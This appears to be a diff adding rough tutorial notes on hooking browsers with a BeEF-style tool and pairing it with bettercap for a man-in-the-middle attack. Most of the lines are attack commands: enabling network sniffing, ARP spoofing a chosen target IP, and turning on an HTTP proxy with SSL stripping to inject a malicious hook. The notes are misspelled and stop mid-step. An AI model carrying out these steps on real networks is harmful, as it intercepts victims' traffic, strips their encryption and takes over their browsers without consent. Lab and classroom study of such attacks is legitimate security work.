@@ -1,0 +1,11 @@
+Change password (the malicious url will be visible after with the tnterface), then a web terminal will open .
+Once the demo link is clicked the browser is hooked to the tool and its functionalities can be discovered.
+For using it in combination with bettercap, we will first identify our ip - ifconfig - (to confirm your ip type most probably eth0)
+sudo bettercap -iface eth0 (for the better cap interface to run and start our man in the middle attack)
+For our attack we need 3 main modules to activate net.probe , net.reckon , net.sniff
+type thier name and on next to them, to check wheather they are running or not type help
+We also need 2 more modules arp.spoof and http.proxy (for man in the middle attack and malicious hook)
+net.show to see all the devices on your network.
+set arp.spoof.targets -ip of the target- .
+arp.spoof on.
+set http.proxy.sslstrip
